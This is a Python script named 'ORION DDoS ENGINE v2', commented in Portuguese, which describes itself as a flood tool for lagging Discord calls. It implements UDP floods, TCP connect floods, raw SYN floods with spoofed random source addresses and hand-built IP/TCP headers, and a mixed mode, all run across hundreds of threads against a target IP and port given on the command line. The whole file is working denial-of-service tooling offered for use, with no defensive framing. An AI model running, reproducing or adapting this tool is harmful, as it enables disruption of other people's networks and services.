#!/usr/bin/env python3
"""
ORION DDoS ENGINE v2
UDP/TCP Flood otimizado para lagar calls do Discord
Uso: python3 ddos_engine.py <target_ip> <target_port> <threads> <duration> [type]

Tipos: udp, tcp, syn, mixed
"""

import socket
import threading
import time
import sys
import random
import struct
import os

BANNER = """
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔════╝ ██╔════╝
██║  ██║██║  ██║██║  ███╗███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
"""

class DDoSEngine:
    def __init__(self, target_ip, target_port, threads=500, duration=60, attack_type='udp'):
        self.target_ip = target_ip
        self.target_port = target_port
        self.threads = threads
        self.duration = duration
        self.attack_type = attack_type
        self.running = False
        self.packets_sent = 0
        self.lock = threading.Lock()
        
    def generate_udp_packet(self, size=1024):
        """Generate a random UDP packet payload"""
        chars = b'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?/~`'
        payload = bytearray()
        for _ in range(size):
            payload.append(random.choice(chars))
        return bytes(payload)
    
    def udp_flood(self):
        """UDP flood attack"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                
                # Randomize port if target port is 0
                port = self.target_port if self.target_port > 0 else random.randint(1, 65535)
                
                packet = self.generate_udp_packet(random.randint(512, 1500))
                sock.sendto(packet, (self.target_ip, port))
                
                with self.lock:
                    self.packets_sent += 1
                
                sock.close()
            except:
                pass
    
    def tcp_flood(self):
        """TCP SYN-like flood"""
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.1)
                port = self.target_port if self.target_port > 0 else random.randint(1, 65535)
                sock.connect_ex((self.target_ip, port))
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
            except:
                pass
    
    def syn_flood(self):
        """Raw SYN flood - requires root/raw socket permissions"""
        while self.running:
            try:
                # Try with raw socket first
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Build IP header
                source_ip = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
                dest_ip = self.target_ip
                
                # IP header
                ip_ihl = 5
                ip_ver = 4
                ip_tos = 0
                ip_tot_len = 40  # IP header + TCP header (no options)
                ip_id = random.randint(1, 65535)
                ip_frag_off = 0
                ip_ttl = random.randint(64, 255)
                ip_proto = socket.IPPROTO_TCP
                ip_check = 0
                ip_saddr = socket.inet_aton(source_ip)
                ip_daddr = socket.inet_aton(dest_ip)
                
                ip_header = struct.pack('!BBHHHBBH4s4s',
                    (ip_ver << 4) + ip_ihl,
                    ip_tos,
                    ip_tot_len,
                    ip_id,
                    ip_frag_off,
                    ip_ttl,
                    ip_proto,
                    ip_check,
                    ip_saddr,
                    ip_daddr
                )
                
                # TCP header
                source_port = random.randint(1024, 65535)
                dest_port = self.target_port if self.target_port > 0 else random.randint(1, 65535)
                seq_num = random.randint(0, 4294967295)
                ack_num = 0
                data_offset = 5  # 5 words = 20 bytes
                flags = 0x02  # SYN flag
                window = socket.htons(65535)
                checksum = 0
                urgent_ptr = 0
                
                tcp_header = struct.pack('!HHLLBBHHH',
                    source_port,
                    dest_port,
                    seq_num,
                    ack_num,
                    (data_offset << 4),
                    flags,
                    window,
                    checksum,
                    urgent_ptr
                )
                
                # Pseudo header for checksum
                source_address = socket.inet_aton(source_ip)
                dest_address = socket.inet_aton(dest_ip)
                placeholder = 0
                protocol = socket.IPPROTO_TCP
                tcp_length = len(tcp_header)
                
                psh = struct.pack('!4s4sBBH',
                    source_address,
                    dest_address,
                    placeholder,
                    protocol,
                    tcp_length
                )
                psh = psh + tcp_header
                
                tcp_checksum = self.checksum(psh)
                
                tcp_header = struct.pack('!HHLLBBHHH',
                    source_port,
                    dest_port,
                    seq_num,
                    ack_num,
                    (data_offset << 4),
                    flags,
                    window,
                    tcp_checksum,
                    urgent_ptr
                )
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (dest_ip, 0))
                sock.close()
                
                with self.lock:
                    self.packets_sent += 1
            except PermissionError:
                # Fallback to regular TCP if no raw socket
                self.attack_type = 'tcp'
                return
            except:
                pass
    
    def checksum(self, data):
        """Calculate checksum for raw packets"""
        if len(data) % 2 != 0:
            data += b'\x00'
        s = 0
        for i in range(0, len(data), 2):
            w = (data[i] << 8) + data[i+1]
            s += w
        s = (s >> 16) + (s & 0xffff)
        s = s + (s >> 16)
        return ~s & 0xffff
    
    def mixed_flood(self):
        """Mixed UDP + TCP flood"""
        while self.running:
            try:
                if random.random() < 0.7:  # 70% UDP
                    self.udp_flood()
                else:  # 30% TCP
                    self.tcp_flood()
            except:
                pass
    
    def stats_reporter(self):
        """Print stats every 5 seconds"""
        while self.running:
            time.sleep(5)
            with self.lock:
                pps = self.packets_sent / 5
            sys.stderr.write(f"\r[ORION DDoS] 📊 {self.packets_sent} pacotes | {pps:.0f} pps | Alvo: {self.target_ip}:{self.target_port} | Tipo: {self.attack_type}    ")
            sys.stderr.flush()
    
    def start(self):
        """Start the attack"""
        self.running = True
        
        print(f"\n🔥 ORION DDoS ENGINE")
        print(f"📍 Alvo: {self.target_ip}:{self.target_port}")
        print(f"🧵 Threads: {self.threads}")
        print(f"⏱ Duracao: {self.duration}s")
        print(f"📦 Tipo: {self.attack_type}")
        print(f"\n💥 Iniciando ataque em 3 segundos...\n")
        time.sleep(3)
        
        # Start stats reporter
        stats_thread = threading.Thread(target=self.stats_reporter, daemon=True)
        stats_thread.start()
        
        # Select attack method
        if self.attack_type == 'udp':
            flood_func = self.udp_flood
        elif self.attack_type == 'tcp':
            flood_func = self.tcp_flood
        elif self.attack_type == 'syn':
            flood_func = self.syn_flood
        elif self.attack_type == 'mixed':
            flood_func = self.mixed_flood
        else:
            flood_func = self.udp_flood
        
        # Launch threads
        threads = []
        for i in range(self.threads):
            t = threading.Thread(target=flood_func, daemon=True)
            t.start()
            threads.append(t)
        
        # Run for duration
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass
        
        self.running = False
        
        print(f"\n\n✅ Ataque finalizado!")
        print(f"📊 Total pacotes: {self.packets_sent}")
        print(f"📈 Media: {self.packets_sent/max(self.duration,1):.0f} pps\n")


if __name__ == '__main__':
    import sys
    
    if len(sys.argv) < 4:
        print(f"{BANNER}")
        print("Uso: python3 ddos_engine.py <target_ip> <target_port> <threads> <duration> [type]")
        print("Tipos: udp (padrao), tcp, syn, mixed")
        print("Ex: python3 ddos_engine.py 192.168.1.1 443 500 60 mixed")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    threads = int(sys.argv[3])
    duration = int(sys.argv[4])
    attack_type = sys.argv[5] if len(sys.argv) > 5 else 'udp'
    
    if attack_type not in ['udp', 'tcp', 'syn', 'mixed']:
        print(f"❌ Tipo invalido: {attack_type}")
        sys.exit(1)
    
    engine = DDoSEngine(target_ip, target_port, threads, duration, attack_type)
    engine.start()
